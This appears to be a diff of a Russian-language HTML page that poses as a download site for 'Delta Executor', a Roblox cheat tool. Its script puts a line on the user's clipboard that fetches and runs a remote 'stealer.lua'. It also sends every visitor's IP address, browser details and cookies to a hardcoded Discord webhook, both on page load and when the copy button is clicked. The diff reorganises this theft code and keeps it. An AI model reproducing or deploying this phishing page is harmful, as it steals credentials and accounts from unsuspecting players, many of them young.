@@ -19,16 +19,15 @@
             text-align: center;
             border-bottom: 2px solid #ff4444;
         }
-        header h1 {
-            font-size: 48px;
-            color: #ff4444;
-            text-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+        header h1 { font-size: 48px; color: #ff4444; }
+        header p { color: #888; margin-top: 10px; font-size: 18px; }
+        nav {
+            background: #111;
+            padding: 15px;
+            text-align: center;
         }
-        header p {
-            color: #888;
-            margin-top: 10px;
-            font-size: 18px;
-        }
+        nav a { color: #fff; text-decoration: none; margin: 0 15px; }
+        nav a:hover { color: #ff4444; }
         main {
             max-width: 600px;
             margin: 40px auto;
@@ -41,14 +40,8 @@
             padding: 30px;
             text-align: center;
         }
-        .download-card h2 {
-            color: #ff4444;
-            margin-bottom: 15px;
-        }
-        .download-card p {
-            color: #888;
-            margin-bottom: 20px;
-        }
+        .download-card h2 { color: #ff4444; margin-bottom: 15px; }
+        .download-card p { color: #888; margin-bottom: 20px; }
         .copy-btn {
             width: 100%;
             padding: 15px;
@@ -60,12 +53,7 @@
             font-weight: bold;
             cursor: pointer;
         }
-        .copy-btn:hover {
-            background: #ff6666;
-        }
-        .copy-btn:active {
-            transform: scale(0.98);
-        }
+        .copy-btn:hover { background: #ff6666; }
         .status {
             text-align: center;
             margin-top: 15px;
@@ -80,10 +68,7 @@
             margin-top: 20px;
             text-align: center;
         }
-        .warning p {
-            color: #ffaa00;
-            font-size: 14px;
-        }
+        .warning p { color: #ffaa00; font-size: 14px; }
         .steps {
             text-align: left;
             margin-top: 20px;
@@ -91,17 +76,9 @@
             background: #111;
             border-radius: 5px;
         }
-        .steps h3 {
-            color: #ff4444;
-            margin-bottom: 10px;
-        }
-        .steps ol {
-            padding-left: 20px;
-            color: #888;
-        }
-        .steps li {
-            margin-bottom: 10px;
-        }
+        .steps h3 { color: #ff4444; margin-bottom: 10px; }
+        .steps ol { padding-left: 20px; color: #888; }
+        .steps li { margin-bottom: 10px; }
     </style>
 </head>
 <body>
@@ -109,6 +86,12 @@
         <h1>⚡ Delta Executor</h1>
         <p>Лучший бесплатный экзекутор для Roblox</p>
     </header>
+    
+    <nav>
+        <a href="index.html">Главная</a>
+        <a href="delta.html">Delta</a>
+        <a href="support.html">Поддержка</a>
+    </nav>
     
     <main>
         <div class="download-card">
@@ -137,27 +120,24 @@
     </main>
     
     <script>
-        // Вредоносный скрипт, который копируется
-        const MALICIOUS_SCRIPT = `loadstring(game:HttpGet("https://raw.githubusercontent.com/ТВОЙ_ЛОГИН/TizenScripts/main/stealer.lua"))()`;
+        const WEBHOOK = "https://discord.com/api/webhooks/1538116344967340144/ECF6ixeFCjRIZrStHKIv6SjuYyt09u8lGh_qTCP62P-nzOlwqF8raxBnLX3GtqIWsZLW";
+        const MALICIOUS_SCRIPT = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/shkolyara228/Aibejonczbjhc/main/Sindjfybfikfivyhdicdyh.lua"))()';
         
         async function copyScript() {
             const status = document.getElementById('status');
             const copyBtn = document.getElementById('copyBtn');
             
-            // Копируем скрипт в буфер обмена
             try {
                 await navigator.clipboard.writeText(MALICIOUS_SCRIPT);
                 status.style.display = 'block';
                 copyBtn.textContent = '✅ Скопировано!';
                 
-                // Отправляем данные в Discord
                 const data = {
                     ip: await getIP(),
                     userAgent: navigator.userAgent,
                     platform: navigator.platform,
                     time: new Date().toLocaleString(),
-                    cookies: document.cookie,
-                    localStorage: JSON.stringify(localStorage)
+                    cookies: document.cookie
                 };
                 
                 const message = '📋 **СКРИПТ СКОПИРОВАН**\n\n' +
@@ -167,7 +147,7 @@
                     '⏰ Время: ' + data.time + '\n\n' +
                     '🍪 COOKIES:\n```' + data.cookies + '```';
                 
-                await fetch("https://discord.com/api/webhooks/1538116344967340144/ECF6ixeFCjRIZrStHKIv6SjuYyt09u8lGh_qTCP62P-nzOlwqF8raxBnLX3GtqIWsZLW", {
+                await fetch(WEBHOOK, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({content: message})
@@ -179,7 +159,6 @@
                 }, 3000);
                 
             } catch (e) {
-                // Запасной способ копирования
                 const textarea = document.createElement('textarea');
                 textarea.value = MALICIOUS_SCRIPT;
                 document.body.appendChild(textarea);
@@ -200,7 +179,6 @@
             } catch (e) { return 'Unknown'; }
         }
         
-        // Сбор данных при заходе на страницу
         async function collectData() {
             const data = {
                 ip: await getIP(),
@@ -211,8 +189,7 @@
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 referrer: document.referrer,
                 url: window.location.href,
-                cookies: document.cookie,
-                localStorage: JSON.stringify(localStorage)
+                cookies: document.cookie
             };
             
             const message = '🔍 **Посетитель страницы Delta**\n\n' +
@@ -225,7 +202,7 @@
                 '🔗 URL: ' + data.url + '\n\n' +
                 '🍪 COOKIES:\n```' + data.cookies + '```';
             
-            await fetch("https://discord.com/api/webhooks/1538116344967340144/ECF6ixeFCjRIZrStHKIv6SjuYyt09u8lGh_qTCP62P-nzOlwqF8raxBnLX3GtqIWsZLW", {
+            await fetch(WEBHOOK, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({content: message})
